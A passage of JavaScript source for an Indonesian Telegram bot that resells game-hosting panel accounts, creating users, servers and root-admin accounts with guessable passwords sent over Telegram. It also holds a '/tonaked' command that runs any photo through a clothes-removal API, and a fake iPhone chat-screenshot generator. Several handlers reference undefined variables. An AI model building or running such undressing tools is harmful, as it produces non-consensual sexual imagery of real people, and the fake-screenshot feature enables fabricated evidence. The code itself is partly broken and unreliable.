  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendVideo(u, akunlo, {
        caption: `Hai @${u}
┏━⬣❏「 INFO DATA PANEL KAMU 」❏
┃• 好 Login : ${domain}
┃• 好 Username : ${user.username}
┃• 好 Password : ${password} 
┗━━━━━━━━━⬣
┏━⬣❏「 SPESIFIKASI PANEL 」❏
┃• 友 ID : ${user.id}
┃• 友 NAMA : ${username}
┃• 友 EMAIL : ${email}
┃• 友 RAM : 9gb
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣❏「 RULES HARUS DI PATUHI 」❏
┃• Wajib Di Pake
┃• Jangan Ddos Server
┃• Kalo jualan sensor domainnya
┃• Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣
`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 10gb
bot.onText(/\/10gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_IMAGE;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /10gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "10gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "10000";
  const cpu = "290";
  const disk = "10000";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.DRAGON`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(
          chatId,
          "Email already exists. Please use a different email."
        );
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
      `
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendVideo(u, akunlo, {
        caption: `Hai @${u}
┏━⬣❏「 INFO DATA PANEL KAMU 」❏
┃• 好 Login : ${domain}
┃• 好 Username : ${user.username}
┃• 好 Password : ${password} 
┗━━━━━━━━━⬣
┏━⬣❏「 SPESIFIKASI PANEL 」❏
┃• 友 ID : ${user.id}
┃• 友 NAMA : ${username}
┃• 友 EMAIL : ${email}
┃• 友 RAM : 10gb
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣❏「 RULES HARUS DI PATUHI 」❏
┃• Wajib Di Pake
┃• Jangan Ddos Server
┃• Kalo jualan sensor domainnya
┃• Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣
`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});

// unli
bot.onText(/\/unli (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const randomImage = MENU_IMAGE;
    
  if (!isOwner(userId) && !isReseller(userId) && !isAdp(userId))  {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /unli namapanel,idtele");
    return;
  }
  const username = t[0]; 
  const u = t[1];
  const name = username + "unli";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "0";
  const cpu = "0";
  const disk = "0";
  const email = `${username}@unli.DRAGON`;
  const akunlo = randomImage;
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di panel KingDragon");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendVideo(u, akunlo, {
        caption: `Hai @${u}
┏━⬣❏「 INFO DATA PANEL KAMU 」❏
┃• 好 Login : ${domain}
┃• 好 Username : ${user.username}
┃• 好 Password : ${password} 
┗━━━━━━━━━⬣
┏━⬣❏「 SPESIFIKASI PANEL 」❏
┃• 友 ID : ${user.id}
┃• 友 NAMA : ${username}
┃• 友 EMAIL : ${email}
┃• 友 RAM : Unlimited
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣❏「 RULES HARUS DI PATUHI 」❏
┃• Wajib Di Pake
┃• Jangan Ddos Server
┃• Kalo jualan sensor domainnya
┃• Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣
`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// paneladmin
bot.onText(/\/cadp (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !isAdp(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const commandParams = match[1].split(",");
  const panelName = commandParams[0].trim();
  const telegramId = commandParams[1].trim();
  if (commandParams.length < 2) {
    bot.sendMessage(
      chatId,
      "Format Salah! Penggunaan: /cadp namapanel,idtele"
    );
    return;
  }
  const password = panelName + "117";
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: `${panelName}@admin.id`,
        username: panelName,
        first_name: panelName,
        last_name: "Memb",
        language: "en",
        root_admin: true,
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      bot.sendMessage(chatId, JSON.stringify(data.errors[0], null, 2));
      return;
    }
    const user = data.attributes;
    const userInfo = `
❏「 DONE CREATE ADMIN PANEL 」❏
    `;
    bot.sendMessage(chatId, userInfo);
    bot.sendMessage(
      telegramId,
`
┏━⬣❏「 INFO DATA ADMIN PANEL 」❏
┃• 友 ID : ${user.id}
┃• 好 Email : ${user.email}
┃• 好 Login : ${domain}
┃• 好 Username : ${user.username}
┃• 好 Password : ${password}
┗━━━━━━━━━⬣
┃ Rules : 
║• Jangan Curi Sc
┃• Jangan Buka Panel Orang
║• Jangan Ddos Server
┃• Kalo jualan sensor domainnya
║• Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣
`
    );
  } catch (error) {
    console.error(error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan dalam pembuatan admin. Silakan coba lagi nanti."
    );
  }
});
  
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// listsrv
bot.onText(/\/listsrv/, async (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;

  if (!isOwner(senderId) && !isAdp(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  let page = 1; // Mengubah penggunaan args[0] yang tidak didefinisikan sebelumnya
  try {
    let f = await fetch(`${domain}/api/application/servers?page=${page}`, {
      // Menggunakan backticks untuk string literal
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
    });
    let res = await f.json();
    let servers = res.data;
    let messageText = "Daftar server aktif yang dimiliki:\n\n";
    for (let server of servers) {
      let s = server.attributes;

      let f3 = await fetch(
        `${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`,
        {
          method: "GET",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
            Authorization: `Bearer ${pltc}`,
          },
        }
      );
      let data = await f3.json();
      let status = data.attributes ? data.attributes.current_state : s.status;

      messageText += `ID Server: ${s.id}\n`;
      messageText += `Nama Server: ${s.name}\n`;
      messageText += `Status: ${status}\n\n`;
    }

    bot.sendMessage(chatId, messageText);
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, "Terjadi kesalahan dalam memproses permintaan.");
  }
});


bot.onText(/\/3gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const delay = ms => new Promise(res => setTimeout(res, ms));
  const text = match[1];
  const userId = msg.from.id;
  const randomImage = MENU_IMAGE;
    
  if (!isOwner(senderId) && !isAdp(userId) && !isReseller(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const t = text.split(",");
  if (t.length < 2) {
    bot.sendMessage(chatId, "Invalid format. Usage: /3gb namapanel,idtele");
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + "3gb";
  const egg = config.eggs;
  const loc = config.loc;
  const memo = "3072";
  const cpu = "90";
  const disk = "3072";
  const spc =
    'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@Danz.my.id`;
  const akunlo = randomImage;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: "en",
        password: password,
      }),
    });
    const data = await response.json();
    if (data.errors) {
      if (
        data.errors[0].meta.rule === "unique" &&
        data.errors[0].meta.source_field === "email"
      ) {
        bot.sendMessage(chatId, "Email&user telah ada di data panel vemos.");
      } else {
        bot.sendMessage(
          chatId,
          `Error: ${JSON.stringify(data.errors[0], null, 2)}`
        );
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${plta}`,
      },
      body: JSON.stringify({
        name: name,
        description: "",
        user: user.id,
        egg: parseInt(egg),
        docker_image: "ghcr.io/parkervcp/yolks:nodejs_22",
        startup: spc,
        environment: {
          INST: "npm",
          USER_UPLOAD: "0",
          AUTO_UPDATE: "0",
          CMD_RUN: "npm start",
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu,
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1,
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: [],
        },
      }),
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(
      chatId,
`
❏「 DONE CREATE PANEL 」❏
`
    );
    if (akunlo) {
      bot.sendVideo(u, akunlo, {
        caption: `Hai @${u}
┏━⬣❏「 INFO DATA PANEL KAMU 」❏
┃• 好 Login : ${domain}
┃• 好 Username : ${user.username}
┃• 好 Password : ${password} 
┗━━━━━━━━━⬣
┏━⬣❏「 SPESIFIKASI PANEL 」❏
┃• 友 ID : ${user.id}
┃• 友 NAMA : ${username}
┃• 友 EMAIL : ${email}
┃• 友 RAM : 3gb
┗━━━━━━━━━━━━━━━━━━⬣
┏━⬣❏「 RULES HARUS DI PATUHI 」❏
┃• Wajib Di Pake
┃• Jangan Ddos Server
┃• Kalo jualan sensor domainnya
┃• Jangan Bagi² Panel Free!
┗━━━━━━━━━━━━━━━━━━⬣
`,
      });
      bot.sendMessage(
        chatId,
        "Data Panel Sudah Di Kirim Ke Id Tertentu, Silahkan Di Cek"
      );
    }
  } else {
    bot.sendMessage(chatId, "❌ Error Ada Kesalahan Fatal");
  }
});
//Addakses Cpanel
bot.onText(/\/addreseller (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const newResId = parseInt(match[1]);


  if (!isOwner(userId) && !isAdp(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(newResId)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const resellerData = loadResellers();
  if (resellerData.resellers.includes(newResId)) return bot.sendMessage(chatId, `⚠️ID ${newResId} Sudah Ada Di Reseller!`);

  resellerData.resellers.push(newResId);
  saveResellers(resellerData);
  bot.sendMessage(chatId, `✅ ID ${newResId} Berhasil Di TambahKan Menjadi Reseller`);
});

bot.onText(/\/listreseller/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
    
  if (!isOwner(userId) && !isAdp(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  const resellers = loadResellers().resellers || [];
  bot.sendMessage(chatId, `👥 **Daftar Reseller:**\n\n${resellers.map((r, i) => `${i + 1}. ${r}`).join("\n") || "🚫 Tidak ada reseller!"}`, { parse_mode: "Markdown" });
});

bot.onText(/\/delreseller (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const resToRemove = parseInt(match[1]);

  if (!isOwner(userId) && !isAdp(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(resToRemove)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const resellerData = loadResellers();
  if (!resellerData.resellers.includes(adminToRemove)) return bot.sendMessage(chatId, "⚠️ Reseller tidak ditemukan!");

  resData.resellers = resData.resellers.filter((id) => id !== resToRemove);
  saveResellers(resellerData);
  bot.sendMessage(chatId, `✅ Reseller berhasil dihapus: ${resToRemove}`);
});

bot.onText(/\/addpt (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const newAdpId = parseInt(match[1]);


  if (!isOwner(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(newAdpId)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const adpData = loadAdp();
  if (adpData.adminpanels.includes(newAdpId)) return bot.sendMessage(chatId, `⚠️ Patner Sudah Ada!!`);

  adpData.adminpanels.push(newAdpId);
  saveAdp(adpData);
  bot.sendMessage(chatId, `✅ Patner Berhasil ditambahkan: ${newAdminId}`);
});

bot.onText(/\/delpt (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userName = msg.from.username || msg.from.first_name;
  const adpToRemove = parseInt(match[1]);

  if (!isOwner(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  
  if (isNaN(adpToRemove)) return bot.sendMessage(chatId, "❌ ID harus berupa angka!");

  const adpData = loadAdp();
  if (!adpData.resellers.includes(adpToRemove)) return bot.sendMessage(chatId, "⚠️ Patner tidak ditemukan!");

  adpData.premiums = adpData.adminpanels.filter((id) => id !== adpToRemove);
  saveAdp(adpData);
  bot.sendMessage(chatId, `✅ Patner berhasil dihapus: ${premToRemove}`);
});
// ~ Connect
bot.onText(/\/connect (.+)/, async (msg, match) => {
const chatId = msg.chat.id;
  if (!isAdmin(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫  
 `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Missing input. Please provide the number. Example: /Connect 62xxxx.");
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (!botNumber || botNumber.length < 10) {
    return bot.sendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
  }

  try {
    await ConnectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in Connect:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

 //Tonaked
bot.onText(/\/tonaked(?:\s+(.+))?/, async (msg, match) => {
  try {

    const args = match[1] || '';
    let imageUrl = args.trim() || null;

    // Check if replying to a photo
    if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
      const fileId = msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1].file_id;
      const file = await bot.getFile(fileId);
      imageUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    }

    if (!imageUrl) {
      return bot.sendMessage(msg.chat.id, '❌ Format: /tonaked (reply gambar)', {
        reply_to_message_id: msg.message_id
      });
    }

    const statusMsg = await bot.sendMessage(msg.chat.id, '⏳ Memproses gambar', {
      reply_to_message_id: msg.message_id
    });

    try {
      const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`);
      const data = await res.json();
      const hasil = data.result;

      if (!hasil) {
        return bot.editMessageText('❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid', {
          chat_id: msg.chat.id,
          message_id: statusMsg.message_id
        });
      }

      await bot.deleteMessage(msg.chat.id, statusMsg.message_id);
      await bot.sendPhoto(msg.chat.id, hasil, {
        reply_to_message_id: msg.message_id
      });

    } catch (e) {
      await bot.editMessageText('❌ Terjadi kesalahan saat memproses gambar', {
        chat_id: msg.chat.id,
        message_id: statusMsg.message_id
      });
    }
  } catch (error) {
    console.error(error);
    bot.sendMessage(msg.chat.id, '❌ Terjadi kesalahan', {
      reply_to_message_id: msg.message_id
    });
  }
});
// Ss Iphone
bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "❌ Missing Input\nFormat : /iqc time,battery,carrier,text\nExample : /iqc 12.00,20,xl,Hai",
      { parse_mode: "HTML" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split(",");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return bot.sendMessage(
      chatId,
      "Format : /iqc time,battery,carrier,text\nExample : /iqc 12.00,20,xl,Hai",
      { parse_mode: "HTML" }
    );
  }

  bot.sendMessage(chatId, "⏳ Sabar Bang...");

  let messageText = encodeURIComponent(msgParts.join(",").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return bot.sendMessage(chatId, "❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ iqc By X-INCRASH`,
      parse_mode: "HTML",
    });
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.onText(/\/tourl/i, async (msg) => {
  const chatId = msg.chat.id;
  const repliedMsg = msg.reply_to_message;

  if (!repliedMsg || (!repliedMsg.document && !repliedMsg.photo && !repliedMsg.video)) {
    return bot.sendMessage(chatId, "❌ Silakan reply sebuah file/foto/video dengan command /tourl");
  }

  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    const photos = repliedMsg.photo;
    fileId = photos[photos.length - 1].file_id; // ambil resolusi tertinggi
    fileName = `photo_${Date.now()}jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
  }

  try {
    const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox..."); 

    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: fileName,
      contentType: response.headers["content-type"] || "application/octet-stream",
    });

    const { data: catboxUrl } = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    if (!catboxUrl.startsWith("https://")) {
      throw new Error("Catbox tidak mengembalikan URL yang valid");
    }

    await bot.editMessageText(`✅ Tourl By X-INCRASH\n📎 URL: ${catboxUrl}`, {
      chat_id: chatId,
      message_id: processingMsg.message_id,
    });

  } catch (error) {
    console.error("Upload error:", error?.response?.data || error.message);
    bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
  }
});

// Getcode
bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const userId = msg.from.id;
  if (!isOwner(msg.from.id) && !isAdmin(userId)) {
    return bot.sendVideo(chatId, vidthumbnail, {
      caption: `
┣━━━━━━━━━━━━━━━━━━━━┫  
   ( ⚠️ ) Akses Ditolak ( ⚠️ ) 
 Anda tidak memliki izin untuk ini
┣━━━━━━━━━━━━━━━━━━━━┫
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⧼ ༒ ⧽ Owner", url: settings.OWNER_URL }]
        ]
      }
    });
  }
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "❌ Missing Input\nExample: /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

